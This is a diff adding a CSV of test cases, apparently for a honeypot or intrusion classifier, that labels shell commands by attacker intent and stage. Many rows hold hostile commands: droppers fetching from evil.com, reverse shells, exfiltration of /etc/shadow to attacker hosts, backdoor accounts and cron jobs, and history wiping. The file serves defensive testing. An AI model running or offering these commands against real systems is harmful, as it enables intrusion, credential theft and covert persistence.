@@ -1,0 +1,43 @@
+test_id,expected_intent,expected_attack_stage,scenario,event_type,command
+TC-CRED-01,CREDENTIAL_ACCESS,CREDENTIAL_ACCESS,Failed authentication attempt (brute-force login),login_failed,
+TC-CRED-02,CREDENTIAL_ACCESS,CREDENTIAL_ACCESS,Reading /etc/shadow for password hashes,command_input,cat /etc/shadow
+TC-CRED-03,CREDENTIAL_ACCESS,CREDENTIAL_ACCESS,Dumping SSH private key,command_input,cat ~/.ssh/id_rsa
+TC-CRED-04,CREDENTIAL_ACCESS,CREDENTIAL_ACCESS,Searching bash history for passwords,command_input,cat .bash_history
+TC-CRED-05,CREDENTIAL_ACCESS,CREDENTIAL_ACCESS,Grep for credentials in configuration files,command_input,grep -i password /etc/mysql/my.cnf
+TC-PRIV-01,PRIVILEGE_ESCALATION,PRIVILEGE_ESCALATION,sudo -l to enumerate sudo permissions,command_input,sudo -l
+TC-PRIV-02,PRIVILEGE_ESCALATION,PRIVILEGE_ESCALATION,su root to switch to root user,command_input,su root
+TC-PRIV-03,PRIVILEGE_ESCALATION,PRIVILEGE_ESCALATION,find SUID binaries for privilege escalation vector,command_input,find / -perm -4000 -type f 2>/dev/null
+TC-PRIV-04,PRIVILEGE_ESCALATION,PRIVILEGE_ESCALATION,pkexec invocation for local privilege escalation,command_input,pkexec /bin/bash
+TC-EXEC-01,EXECUTION,EXECUTION,wget payload and pipe to bash (dropper),command_input,wget http://evil.com/payload.sh -O /tmp/p.sh; bash /tmp/p.sh
+TC-EXEC-02,EXECUTION,EXECUTION,curl pipe to bash (one-liner dropper),command_input,curl http://malware.net/install.sh | bash
+TC-EXEC-03,EXECUTION,EXECUTION,bash reverse shell via /dev/tcp,command_input,bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+TC-EXEC-04,EXECUTION,EXECUTION,Python inline socket reverse shell,command_input,"python3 -c 'import socket,os,subprocess; s=socket.socket(); s.connect((""10.0.0.1"",4444))'"
+TC-EXEC-05,EXECUTION,EXECUTION,netcat reverse shell execution,command_input,nc 10.0.0.1 4444 -e /bin/bash
+TC-PERS-01,PERSISTENCE,PERSISTENCE,Add attacker SSH public key to authorized_keys,command_input,echo 'ssh-rsa AAAAB3NzaC1...' >> ~/.ssh/authorized_keys
+TC-PERS-02,PERSISTENCE,PERSISTENCE,crontab -e to install persistence via cron,command_input,crontab -e
+TC-PERS-03,PERSISTENCE,PERSISTENCE,Append malicious cron job to /etc/crontab,command_input,echo '*/5 * * * * root /tmp/backdoor.sh' >> /etc/crontab
+TC-PERS-04,PERSISTENCE,PERSISTENCE,Create backdoor sudo account,command_input,useradd hacker -G sudo
+TC-EXFIL-01,EXFILTRATION,EXFILTRATION,tar archive /etc and transfer via curl,command_input,tar -czf /tmp/loot.tar.gz /etc && curl -X POST -F file=@/tmp/loot.tar.gz http://evil.com/upload
+TC-EXFIL-02,EXFILTRATION,EXFILTRATION,scp /etc/passwd to remote attacker host,command_input,scp /etc/passwd attacker@192.168.1.100:~/loot/
+TC-EXFIL-03,EXFILTRATION,EXFILTRATION,nc pipe of /etc/shadow to remote host,command_input,nc 10.0.0.1 1234 < /etc/shadow
+TC-EXFIL-04,EXFILTRATION,EXFILTRATION,rsync home directory to remote attacker,command_input,rsync -avz /home/ attacker@10.0.0.1:/dump/
+TC-CLEAN-01,CLEANUP,CLEANUP,history -c to wipe shell history,command_input,history -c
+TC-CLEAN-02,CLEANUP,CLEANUP,rm -rf .bash_history to erase history file,command_input,rm -rf ~/.bash_history
+TC-CLEAN-03,CLEANUP,CLEANUP,unset HISTFILE to prevent history logging,command_input,unset HISTFILE
+TC-CLEAN-04,CLEANUP,CLEANUP,export HISTSIZE=0 to suppress history,command_input,export HISTSIZE=0
+TC-EXPLOIT-01,EXPLOITATION,EXECUTION,Shellshock exploit pattern via bash function injection,command_input,() { :; }; /bin/bash -i
+TC-EXPLOIT-02,EXPLOITATION,EXECUTION,CVE reference in command (exploit probe),command_input,python3 exploit_CVE-2021-4034.py
+TC-EXPLOIT-03,EXPLOITATION,EXECUTION,dirtycow reference in malicious execution,command_input,./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash'
+TC-RECON-01,RECONNAISSANCE,RECONNAISSANCE,whoami — identify current user,command_input,whoami
+TC-RECON-02,RECONNAISSANCE,RECONNAISSANCE,uname -a — full OS and kernel information,command_input,uname -a
+TC-RECON-03,RECONNAISSANCE,RECONNAISSANCE,hostname — identify system hostname,command_input,hostname
+TC-RECON-04,RECONNAISSANCE,RECONNAISSANCE,cat /etc/os-release — OS version fingerprinting,command_input,cat /etc/os-release
+TC-DISC-01,DISCOVERY,DISCOVERY,ls -la / — filesystem root directory listing,command_input,ls -la /
+TC-DISC-02,DISCOVERY,DISCOVERY,ps aux — enumerate running processes,command_input,ps aux
+TC-DISC-03,DISCOVERY,DISCOVERY,netstat -tunlp — open port and network socket discovery,command_input,netstat -tunlp
+TC-DISC-04,DISCOVERY,DISCOVERY,cat /etc/passwd — user account enumeration,command_input,cat /etc/passwd
+TC-DISC-05,DISCOVERY,DISCOVERY,ip a — network interface discovery,command_input,ip a
+TC-OTHER-01,OTHER,INITIAL_ACCESS,Successful SSH authentication (initial access handshake),login_success,
+TC-OTHER-02,OTHER,INITIAL_ACCESS,Session connect event (TCP/SSH connection establishment),session_connect,
+TC-OTHER-03,OTHER,UNKNOWN,benign shell navigation (pwd),command_input,pwd
+TC-OTHER-04,OTHER,UNKNOWN,benign clear command,command_input,clear
